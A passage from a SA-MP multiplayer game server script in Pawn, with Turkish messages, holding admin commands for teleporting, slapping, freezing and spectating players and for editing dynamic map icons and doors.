				SetPlayerPos(playerid,plocx,plocy+2, plocz);
			}

			SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			new giveplayeridvw = GetPlayerVirtualWorld(giveplayerid);
			new giveplayerint =  GetPlayerInterior(giveplayerid);
			PlayerInfo[playerid][pVW] = giveplayeridvw;
			PlayerInfo[playerid][pInt] = giveplayerint;

			SendClientMessage(playerid, COLOR_WHITE, "Iþýnlandýn!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		}

	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:gethere(playerid, params[]) {
	new
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gethere [Oyuncu ID/Ýsim]");

	new
		Float:plocx,
		Float:plocy,
		Float:plocz;

	if(IsPlayerConnected(giveplayerid)) {
		if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu sana eþit veya daha yüksek leveldeki admin  üzerinde uygulayamazsýn.");

		if(PlayerInfo[playerid][pAdmin] >= 1) {
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	    	if(GetPVarInt(giveplayerid,"MedicCall") == 1)
	    	    return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu þuanda yaralý, /goto komutunu kullanarak teleport olabilirsin.");

			if(GetPlayerState(giveplayerid) == PLAYER_STATE_SPECTATING)
				return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu birini izliyor.");

			GetPlayerPos(playerid, plocx, plocy, plocz);
			Streamer_UpdateEx(giveplayerid, plocx, plocy, plocz);
			SetPVarInt(playerid, "BeingTeleported", 1);

			if(GetPlayerState(giveplayerid) == 2)
			{
				TelePos[giveplayerid][0] = 0.0;
				TelePos[giveplayerid][1] = 0.0;
				fVehSpeed[giveplayerid] = 0.0;
				new tmpcar = GetPlayerVehicleID(giveplayerid);
				SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
				LinkVehicleToInterior(GetPlayerVehicleID(giveplayerid), GetPlayerInterior(playerid));
				SetPlayerInterior(giveplayerid, GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(giveplayerid), GetPlayerVirtualWorld(playerid));
				SetPlayerVirtualWorld(giveplayerid, GetPlayerVirtualWorld(playerid));
			}
			else
			{
				SetPlayerPos(giveplayerid,plocx,plocy+2, plocz);
			}

			SetPlayerInterior(giveplayerid, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(giveplayerid, GetPlayerVirtualWorld(playerid));
			new playeridvw = GetPlayerVirtualWorld(playerid);
			new playerint =  GetPlayerInterior(playerid);
			PlayerInfo[giveplayerid][pVW] = playeridvw;
			PlayerInfo[giveplayerid][pInt] = playerint;

			SendClientMessage(giveplayerid, COLOR_WHITE, "Iþýnlandýn!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		}

	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:beltasfaxx12(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /belt [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(giveplayerid))
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			return SendClientMessage(playerid,COLOR_WHITE, "You can't belt a higher admin.");

		new
			Float:shealth;

		GetPlayerHealth(giveplayerid, shealth);
		SetPlayerHealth(giveplayerid, shealth-5);
		GetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]);
		SetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]-5);
		PlayerPlaySound(giveplayerid, 1130, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]-5);
		format(string, sizeof(string), "AdminKomutu: %s was belted by %s",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
		ABroadCast(COLOR_LIGHTRED,string,1);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:slap(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /slap [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(giveplayerid))
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			return SendClientMessage(playerid,COLOR_WHITE, "Senden yüksek leveldeki admini tokatlayamazsýn.");

		new
			Float:shealth;

		GetPlayerHealth(giveplayerid, shealth);
		SetPlayerHealth(giveplayerid, shealth-5);
		GetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]);
		SetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]+5);
		PlayerPlaySound(giveplayerid, 1130, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]+5);
		format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu %s tarafýndan tokatlandý.",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
		ABroadCast(COLOR_LIGHTRED,string,1);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:freeze(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /serbestbirak [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
				return SendClientMessage(playerid, COLOR_GRAD2, "Senden yüksek leveldeki admini donduramazsýn.");

			TogglePlayerControllable(giveplayerid, 0);
			SetPVarInt(giveplayerid, "IsFrozen", 1);
			format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu % tarafýndan donduruldu.",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
			ABroadCast(COLOR_LIGHTRED,string,1);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	return 1;
}

CMD:unfreeze(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /unfreeze [Oyuncu ID/Ýsim]");


		if(IsPlayerConnected(giveplayerid))
		{
			DeletePVar(giveplayerid, "IsFrozen");
			TogglePlayerControllable(giveplayerid, 1);
			format(string, sizeof(string), "AdminKomutu: %s adlý oyuncunun donmasý  %s tarafýndan kaldýrýldý.",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
			ABroadCast(COLOR_LIGHTRED,string,1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Geçersiz oyuncu.");
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:spec(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(strcmp(params, "off", true) == 0)
	{
		if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 1)
		{
			GettingSpectated[Spectate[playerid]] = 999;
			Spectating[playerid] = 0;
			Spectate[playerid] = 999;
			SetPVarInt(playerid, "SpecOff", 1);
			TogglePlayerSpectating(playerid, false);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Kimseyi izlemiyorsun.");
			return 1;
		}
	}
	if(strcmp(params, "o", true) == 0)
	{
		if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 2)
		{
			GettingSpectated[Spectate[playerid]] = 999;
			Spectating[playerid] = 0;
			Spectate[playerid] = 999;
			SetPVarInt(playerid, "SpecOff", 1);
			TogglePlayerSpectating(playerid, false);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Kimseyi izlemiyorsun.");
			return 1;
		}
	}

	new giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /spec (oyuncu/off)");
	if(IsPlayerConnected(giveplayerid))
	{
		if(InsideTut[giveplayerid] >= 1)
		{
			SendClientMessage(playerid, COLOR_WHITE, "NOT: Bu oyuncu tanýtýmý izliyor. Airbreak tahmini yapmadan önce sýnýrdan çýkmadýklarýna emin olun.");
		}
		if(GetPVarInt(giveplayerid, "PBM") > 0) SendClientMessage(playerid, COLOR_WHITE, "NOT: Bu oyuncu paintballda. Airbreak tahmini yapmadan önce sýnýrdan çýkmadýklarýna emin olun.");
		if(Spectating[playerid] == 0)
		{
			new Float: pPositions[3];
			GetPlayerPos(playerid, pPositions[0], pPositions[1], pPositions[2]);
			SetPVarFloat(playerid, "SpecPosX", pPositions[0]);
			SetPVarFloat(playerid, "SpecPosY", pPositions[1]);
			SetPVarFloat(playerid, "SpecPosZ", pPositions[2]);
			SetPVarInt(playerid, "SpecInt", GetPlayerInterior(playerid));
			SetPVarInt(playerid, "SpecVW", GetPlayerVirtualWorld(playerid));
			if(IsPlayerInAnyVehicle(giveplayerid))
			{
				TogglePlayerSpectating(playerid, true);
				new carid = GetPlayerVehicleID(giveplayerid);
				PlayerSpectateVehicle(playerid, carid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			else
			{
				TogglePlayerSpectating(playerid, true);
				PlayerSpectatePlayer(playerid, giveplayerid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			GettingSpectated[giveplayerid] = playerid;
			Spectate[playerid] = giveplayerid;
			Spectating[playerid] = 1;
		}
		else
		{
			if(IsPlayerInAnyVehicle(giveplayerid))
			{
				TogglePlayerSpectating(playerid, true);
				new carid = GetPlayerVehicleID(giveplayerid);
				PlayerSpectateVehicle(playerid, carid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			else
			{
				TogglePlayerSpectating(playerid, true);
				PlayerSpectatePlayer(playerid, giveplayerid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			GettingSpectated[Spectate[playerid]] = 999;
			GettingSpectated[giveplayerid] = playerid;
			Spectate[playerid] = giveplayerid;
			Spectating[playerid] = 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Hedef müsait deðil.");
	}
	return 1;
}

CMD:dmpedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}

	new string[128], choice[32], mapiconid, amount;
	if(sscanf(params, "s[32]dD", choice, mapiconid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /dmpedit [name] [mapiconid] [(Optional)amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Position, MarkerType, Color, Delete");
		return 1;
	}

	if(mapiconid < 0 || mapiconid >= MAX_DMAPICONS)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Invalid Map Icon ID!");
	}

	if(strcmp(choice, "position", true) == 0)
	{
		GetPlayerPos(playerid, DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ]);
		DMPInfo[mapiconid][dmpInt] = GetPlayerInterior(playerid);
		DMPInfo[mapiconid][dmpVW] = GetPlayerVirtualWorld(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the position!");
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		SaveDynamicMapIcons();
		format(string, sizeof(string), "%s has edited MapIconID %d's Position.", GetPlayerNameEx(playerid), mapiconid);
		Log("logs/dmpedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "delete", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You have deleted the map icon!");
		DMPInfo[mapiconid][dmpPosX] = 0.0;
		DMPInfo[mapiconid][dmpPosY] = 0.0;
		DMPInfo[mapiconid][dmpPosZ] = 0.0;
		DMPInfo[mapiconid][dmpVW] = 0;
		DMPInfo[mapiconid][dmpInt] = 0;
		DMPInfo[mapiconid][dmpMarkerType] = 0;
		DMPInfo[mapiconid][dmpColor] = 0;
		SaveDynamicMapIcons();
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		format(string, sizeof(string), "%s has deleted MapIconID %d.", GetPlayerNameEx(playerid), mapiconid);
		Log("logs/dmpedit.log", string);
		return 1;

	}
	else if(strcmp(choice, "markertype", true) == 0)
	{
		DMPInfo[mapiconid][dmpMarkerType] = amount;
		format(string, sizeof(string), "You have set the marker type to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		format(string, sizeof(string), "%s has edited MapIconID %d's Marker Type to %d.", GetPlayerNameEx(playerid), mapiconid, amount);
		Log("logs/dmpedit.log", string);
	}
	else if(strcmp(choice, "color", true) == 0)
	{
		DMPInfo[mapiconid][dmpColor] = amount;
		format(string, sizeof(string), "You have set the color to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		format(string, sizeof(string), "%s has edited MapIconID %d's Color to %d.", GetPlayerNameEx(playerid), mapiconid, amount);
		Log("logs/dmpedit.log", string);
	}
	SaveDynamicMapIcons();
	return 1;
}

CMD:dmpnext(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 8)
	{
		SendClientMessage(playerid, COLOR_RED, "* Listing next available map icon...");
		for(new x;x<MAX_DMAPICONS;x++)
		{
		    if(DMPInfo[x][dmpMarkerType] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d kullanýma müsait.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	return 1;
}

CMD:dmpnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 8)
	{
		SendClientMessage(playerid, COLOR_RED, "* Listing all map icons within 30 meters of you");
		new Float:X, Float:Y, Float:Z;
  		GetPlayerPos(playerid, X, Y, Z);
		for(new i;i<MAX_DMAPICONS;i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 30, DMPInfo[i][dmpPosX], DMPInfo[i][dmpPosY], DMPInfo[i][dmpPosZ]))
			{
				if(DMPInfo[i][dmpMarkerType] != 0)
				{
				    new string[128];
			    	format(string, sizeof(string), "MapIcon ID %d | %f from you", i, GetDistance(DMPInfo[i][dmpPosX], DMPInfo[i][dmpPosY], DMPInfo[i][dmpPosZ], X, Y, Z));
			    	SendClientMessage(playerid, COLOR_WHITE, string);
				}
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:gotodmp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}

	new mapiconid;
	if(sscanf(params, "d", mapiconid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotodmp [mapiconid]");

	if(mapiconid >= MAX_DMAPICONS || mapiconid < 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /gotodmp [mapiconid]");
		return 1;
	}
	SetPlayerPos(playerid, DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ]);
	SetPlayerVirtualWorld(playerid, DMPInfo[mapiconid][dmpVW]);
	SetPlayerInterior(playerid, DMPInfo[mapiconid][dmpInt]);
	return 1;
}

CMD:ddnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* 15 metre içerisindeki dinamik kapýlar gösteriliyor.");
		new Float:X, Float:Y, Float:Z;
  		GetPlayerPos(playerid, X, Y, Z);
		for(new i;i<MAX_DDOORS;i++)
		{
  			 if(IsPlayerInRangeOfPoint(playerid, 15, DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]))
			{
				if(DDoorsInfo[i][ddDescription] != 0)
				{
				    new string[128];
			    	format(string, sizeof(string), "DynamicDoor ID %d | %f from you", i, GetDistance(DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ], X, Y, Z));
			    	SendClientMessage(playerid, COLOR_WHITE, string);
				}
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:ddedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   }

	new string[128], choice[32], doorid, amount;
	if(sscanf(params, "s[32]dD(1)", choice, doorid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ddedit [name] [doorid] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Exterior, Interior, CustomInterior, CustomExterior, VIP");
		SendClientMessage(playerid, COLOR_GREY, "Gang, Faction, Wanted, Admin, VehicleAble, Color, PickupModel, Delete");
		if(PlayerInfo[playerid][pAdmin] >= 6)
		{
			SendClientMessage(playerid, COLOR_GREY, "NotEditable");
		}
		return 1;
	}

	if(doorid >= MAX_DDOORS)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Invalid Door ID!");
		return 1;
	}

	if(strcmp(choice, "noteditable", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 6)
	    {
			if(DDoorsInfo[doorid][ddNotEditable] == 0)
			{
				DDoorsInfo[doorid][ddNotEditable] = 1;
				SendClientMessage(playerid, COLOR_WHITE, "Door set to not editable (can no longer be edited)!");
		    }
			else
			{
				DDoorsInfo[doorid][ddNotEditable] = 0;
				SendClientMessage(playerid, COLOR_WHITE, "Door set to editable (can be edited again)!");
			}
			SaveDynamicDoors();
			format(string, sizeof(string), "%s has edited DoorID %d's NotEditable.", GetPlayerNameEx(playerid), doorid);
			Log("logs/ddedit.log", string);
		}
		return 1;
	}

	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "Bu kapý Level 6 admin tarafýndan editlenemez hale getirildi, deðiþiklik yapmak için onlara ulaþýn.");
	    return 1;
	}

	if(strcmp(choice, "interior", true) == 0)
	{
		GetPlayerPos(playerid, DDoorsInfo[doorid][ddInteriorX], DDoorsInfo[doorid][ddInteriorY], DDoorsInfo[doorid][ddInteriorZ]);
		GetPlayerFacingAngle(playerid, DDoorsInfo[doorid][ddInteriorA]);
		DDoorsInfo[doorid][ddInteriorInt] = GetPlayerInterior(playerid);
		DDoorsInfo[doorid][ddInteriorVW] = GetPlayerVirtualWorld(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "Interioru deðiþtirdin.");
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Interior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "custominterior", true) == 0)
	{
		if(DDoorsInfo[doorid][ddCustomInterior] == 0)
		{
			DDoorsInfo[doorid][ddCustomInterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to custom interior!");
		}
		else
		{
			DDoorsInfo[doorid][ddCustomInterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to normal (not custom) interior!");
		}
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's CustomInterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "customexterior", true) == 0)
	{
		if(DDoorsInfo[doorid][ddCustomExterior] == 0)
		{
			DDoorsInfo[doorid][ddCustomExterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to custom exterior!");
		}
		else
		{
			DDoorsInfo[doorid][ddCustomExterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to normal (not custom) exterior!");
		}
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's CustomExterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "exterior", true) == 0)
	{
		GetPlayerPos(playerid, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]);
		GetPlayerFacingAngle(playerid, DDoorsInfo[doorid][ddExteriorA]);
		DDoorsInfo[doorid][ddExteriorVW] = GetPlayerVirtualWorld(playerid);
		DDoorsInfo[doorid][ddExteriorInt] = GetPlayerInterior(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "Exterior'u deðiþtirdin.");
		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Exterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
	}
	else if(strcmp(choice, "donator", true) == 0)
	{
		DDoorsInfo[doorid][ddVIP] = amount;

		format(string, sizeof(string), "You have changed the Donator Level to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Donator Level.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "gang", true) == 0)
	{
		DDoorsInfo[doorid][ddGang] = amount;

		format(string, sizeof(string), "You have changed the Family to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Family.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "faction", true) == 0)
	{
		DDoorsInfo[doorid][ddFaction] = amount;

		format(string, sizeof(string), "You have changed the Faction to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Faction.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "admin", true) == 0)
	{
		DDoorsInfo[doorid][ddAdmin] = amount;

		format(string, sizeof(string), "You have changed the Admin Level to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Admin Level.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "wanted", true) == 0)
	{
		DDoorsInfo[doorid][ddWanted] = amount;

		format(string, sizeof(string), "You have changed the Wanted to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Wanted.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "vehicleable", true) == 0)
	{
		DDoorsInfo[doorid][ddVehicleAble] = amount;

		format(string, sizeof(string), "You have changed the VehicleAble to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's VehicleAble.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "color", true) == 0)
	{
		DDoorsInfo[doorid][ddColor] = amount;

		format(string, sizeof(string), "Kapýnýn rengini %d olarak deðiþtirdin.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s, %d ID'li kapýnýn rengini deðiþtirdi.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "pickupmodel", true) == 0)
	{
		DDoorsInfo[doorid][ddPickupModel] = amount;

		format(string, sizeof(string), "Pickup modelini %d olarak deðiþtirdiniz.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
